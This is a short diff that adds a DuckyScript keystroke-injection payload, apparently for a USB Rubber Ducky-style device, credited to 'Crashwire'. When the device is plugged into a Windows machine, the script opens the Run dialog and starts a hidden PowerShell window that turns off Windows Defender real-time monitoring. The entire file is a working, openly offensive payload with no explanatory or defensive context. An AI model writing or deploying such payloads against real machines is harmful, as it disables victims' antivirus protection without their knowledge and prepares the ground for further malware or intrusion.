@@ -1,0 +1,8 @@
+REM AUTHOR Crashwire
+REM DESCRIPTION Disables Windows Defender real-time protection
+ATTACKMODE HID/STORAGE
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell -WindowStyle Hidden -NoP -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
+ENTER
